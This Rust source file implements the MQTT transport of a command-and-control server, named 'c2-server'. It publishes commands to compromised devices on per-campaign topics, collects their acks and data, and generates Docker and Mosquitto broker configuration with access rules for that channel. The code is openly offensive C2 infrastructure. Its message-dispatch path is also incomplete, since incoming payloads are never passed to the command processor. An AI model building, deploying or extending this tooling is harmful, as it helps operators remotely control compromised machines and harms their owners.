use anyhow::Result;
use async_trait::async_trait;
use dashmap::DashMap;
use rumqttc::{AsyncClient, EventLoop, MqttOptions, QoS};
use std::sync::Arc;
use tokio::sync::Mutex;
use tracing::{debug, error, info};

// ============================================================================
// MQTT CLIENT WRAPPER
// ============================================================================

pub struct MqttHandler {
    client: Arc<AsyncClient>,
    event_loop: Arc<Mutex<EventLoop>>,
    device_topics: Arc<DashMap<String, String>>,
    campaign_id: String,
}

impl MqttHandler {
    pub async fn new(broker_addr: &str, campaign_id: String) -> Result<Self> {
        let (host, port) = if let Some(colon) = broker_addr.rfind(':') {
            let host = broker_addr[..colon].to_string();
            let port = broker_addr[colon + 1..].parse::<u16>().unwrap_or(1883);
            (host, port)
        } else {
            (broker_addr.to_string(), 1883u16)
        };

        let mut options = MqttOptions::new("c2-server", &host, port);
        options.set_max_packet_size(128 * 1024, 128 * 1024);
        options.set_clean_session(true);

        let (client, event_loop) = AsyncClient::new(options, 1000);
        info!("MQTT client created for broker: {}:{}", host, port);

        Ok(Self {
            client: Arc::new(client),
            event_loop: Arc::new(Mutex::new(event_loop)),
            device_topics: Arc::new(DashMap::new()),
            campaign_id,
        })
    }

    /// Drive the event loop — call in a background task
    pub async fn poll_events(&self) {
        let mut el = self.event_loop.lock().await;
        loop {
            match el.poll().await {
                Ok(event) => {
                    debug!("MQTT event: {:?}", event);
                }
                Err(e) => {
                    error!("MQTT event loop error: {}", e);
                    break;
                }
            }
        }
    }

    pub async fn subscribe_device(&self, device_id: &str) -> Result<()> {
        let topic = format!("c2/{}/{}/cmd", self.campaign_id, device_id);
        self.client.subscribe(&topic, QoS::AtLeastOnce).await?;
        self.device_topics.insert(device_id.to_string(), topic.clone());
        info!("Device subscribed to MQTT topic: {}", topic);
        Ok(())
    }

    pub async fn unsubscribe_device(&self, device_id: &str) -> Result<()> {
        if let Some((_, topic)) = self.device_topics.remove(device_id) {
            self.client.unsubscribe(&topic).await?;
            info!("Device unsubscribed from MQTT: {}", device_id);
        }
        Ok(())
    }

    pub async fn publish_command(&self, device_id: &str, command: Vec<u8>) -> Result<()> {
        let topic = format!("c2/{}/{}/cmd", self.campaign_id, device_id);
        self.client.publish(&topic, QoS::AtLeastOnce, false, command).await?;
        debug!("Command published to MQTT: device_id={}", device_id);
        Ok(())
    }

    pub async fn publish_ack(&self, device_id: &str, message_id: &str) -> Result<()> {
        let topic = format!("c2/{}/{}/ack", self.campaign_id, device_id);
        self.client
            .publish(&topic, QoS::AtLeastOnce, false, message_id.as_bytes().to_vec())
            .await?;
        Ok(())
    }

    pub fn subscription_count(&self) -> usize {
        self.device_topics.len()
    }

    pub async fn disconnect(&self) -> Result<()> {
        self.client.disconnect().await?;
        info!("MQTT client disconnected");
        Ok(())
    }
}

// ============================================================================
// MQTT MESSAGE HANDLER
// ============================================================================

#[async_trait]
pub trait CommandProcessor: Send + Sync {
    async fn process_device_message(&self, device_id: &str, payload: Vec<u8>) -> Result<()>;
}

pub struct MqttMessageHandler {
    mqtt: Arc<MqttHandler>,
    command_processor: Arc<dyn CommandProcessor>,
}

impl MqttMessageHandler {
    pub fn new(mqtt: Arc<MqttHandler>, processor: Arc<dyn CommandProcessor>) -> Self {
        Self { mqtt, command_processor: processor }
    }

    pub async fn start_listening(&self) -> Result<()> {
        info!("MQTT message listener started");
        self.mqtt.poll_events().await;
        Ok(())
    }
}

// ============================================================================
// DOCKER COMPOSE CONFIG (EMBEDDED)
// ============================================================================

pub fn generate_mqtt_docker_compose() -> String {
    r#"
version: '3.8'
services:
  mosquitto:
    image: eclipse-mosquitto:latest
    container_name: c2-mqtt-broker
    ports:
      - "1883:1883"
      - "8883:8883"
    volumes:
      - ./mosquitto.conf:/mosquitto/config/mosquitto.conf
      - mosquitto-data:/mosquitto/data
      - mosquitto-logs:/mosquitto/log
    networks:
      - c2-network
    restart: unless-stopped

volumes:
  mosquitto-data:
  mosquitto-logs:

networks:
  c2-network:
    driver: bridge
"#.to_string()
}

pub fn generate_mosquitto_config() -> String {
    r#"
listener 1883
protocol mqtt

listener 8883
protocol mqtt
cafile /mosquitto/certs/ca.crt
certfile /mosquitto/certs/server.crt
keyfile /mosquitto/certs/server.key
require_certificate true
use_identity_as_username true

persistence true
persistence_location /mosquitto/data/

acl_file /mosquitto/config/acl.txt

allow_anonymous false
password_file /mosquitto/config/passwords.txt

max_queued_messages 1000
max_connections -1

log_dest file /mosquitto/log/mosquitto.log
log_dest stdout
log_type all
log_timestamp true
"#.to_string()
}

pub fn generate_mosquitto_acl() -> String {
    r#"
user *
topic deny $SYS/#

user c2-server
topic write c2/+/+/cmd
topic read c2/+/+/ack
topic read c2/+/+/data

pattern read c2/%c/+/cmd
pattern write c2/%c/+/ack
pattern write c2/%c/+/data
"#.to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_docker_compose_generation() {
        let config = generate_mqtt_docker_compose();
        assert!(config.contains("eclipse-mosquitto"));
        assert!(config.contains("1883"));
        assert!(config.contains("8883"));
    }

    #[test]
    fn test_mosquitto_config_generation() {
        let config = generate_mosquitto_config();
        assert!(config.contains("listener 1883"));
        assert!(config.contains("listener 8883"));
        assert!(config.contains("require_certificate true"));
    }
}
